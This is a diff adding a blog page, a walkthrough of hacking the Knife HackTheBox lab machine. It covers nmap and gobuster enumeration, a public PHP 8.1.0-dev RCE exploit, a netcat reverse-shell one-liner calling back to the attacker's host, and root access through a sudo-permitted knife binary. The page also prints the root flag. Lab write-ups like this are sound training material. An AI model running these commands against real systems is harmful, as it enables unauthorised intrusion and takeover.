@@ -1,0 +1,253 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Knife HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.87.0">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<h2 class=blog-title>Knife HackTheBox Walkthrough</h2>
+<p><span>August 28, 2021</span> by <span>Nasef</span></p>
+<img class=feature-image src=https://iamnasef.com/images/blog/014/featured-image.png alt=blog-feature-image>
+<p>Hello everybody!
+I am Nasef and today I am going to show you how I hacked Knife machine from hack the box, so let&rsquo;s get started!</p>
+<h3 id=services-enumeration>Services Enumeration</h3>
+<p>Nmap found ports ssh(22) and http (80) open which isn&rsquo;t interesting in itself.</p>
+<pre><code>nmap -sC -sV 10.10.10.242
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:08 EDT
+Nmap scan report for 10.10.10.242
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.77 seconds
+
+</code></pre><p>I ran another nmap scan -sU for enumerating udp services and found two filtered ports, I may look into them.</p>
+<pre><code>nmap -sU 10.10.10.242
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:08 EDT
+Stats: 0:13:55 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 86.59% done; ETC: 12:24 (0:02:09 remaining)
+Stats: 0:13:56 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 86.59% done; ETC: 12:24 (0:02:09 remaining)
+Nmap scan report for 10.10.10.242
+Host is up (0.17s latency).
+Not shown: 998 closed ports
+PORT      STATE         SERVICE
+47765/udp open|filtered unknown
+49207/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 999.46 seconds
+
+</code></pre><p>I ran another nmap scan -p- for enumerating the non-default ports but it gave me nothing new.</p>
+<pre><code>nmap -p- 10.10.10.242
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-24 12:08 EDT
+Nmap scan report for 10.10.10.242
+Host is up (0.17s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 1054.16 seconds
+
+</code></pre><p>This is concludes the service enumeration phase.</p>
+<h3 id=exploiting-http-service>Exploiting HTTP Service</h3>
+<p>Using the current information, I decided to further enumerate the http service, but first I added the hostname of the machine in /etc/hosts because some machines use host routing.</p>
+<p>Then I ran gobuster to enumerate hidden directories, which gave me nothing.</p>
+<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://knife.htb/ -x php,txt,git
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://knife.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,git
+[+] Timeout:                 10s
+===============================================================
+2021/06/24 12:10:01 Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 5815]                           
+===============================================================
+2021/06/24 12:29:30 Finished
+===============================================================
+
+</code></pre><p>I opened knife.htb to see if there are any login forms or anything that we can exploit but nothing also found!</p>
+<p><img src=/images/blog/014/1.png alt=Username></p>
+<p>I opened the inspect element and also, I ran wappalyzer to see the technologies on this website but couldn&rsquo;t find anything indicating that this website is dynamic.
+<img src=/images/blog/014/2.png alt=Username>
+<img src=/images/blog/014/3.png alt=Username></p>
+<p>I opened burpsuite to see what is the request and response look like and found in the response that this website is powered by php 8.1.0-dev,
+<img src=/images/blog/014/4.png alt=Username></p>
+<p>I decided to search for any public vulnerabilities for this version and found a ready to run RCE exploit!</p>
+<pre><code>https://www.exploit-db.com/exploits/49933
+</code></pre><p>I ran the exploit and made a reverse connection to get full working shell</p>
+<pre><code>nc -lvnp nc -lvnp 1111
+
+</code></pre><pre><code>python3 49933.py                                                                                     
+Enter the full host url:
+http://knife.htb
+
+Interactive shell is opened on http://knife.htb 
+Can't acces tty; job crontol turned off.
+$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 1111 &gt;/tmp/f
+
+</code></pre><p>and voila we got into the machine.</p>
+<h3 id=privilege-escalation>Privilege Escalation</h3>
+<p>Before running any heavy privesc scripts, I prefer going through my manual checklist. Starting with sudo, I found that I can run the knife binary as root without password</p>
+<pre><code>$ sudo -l
+Matching Defaults entries for james on knife:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife
+</code></pre><p>After searching I was able to ran ruby commands using knife, so I ran the following command and got root</p>
+<pre><code>$ sudo /usr/bin/knife exec -E 'exec &quot;/bin/bash&quot;'
+whoami
+root
+cat /root/root.txt
+f75db1605732afb572baf9086bbff9c8
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
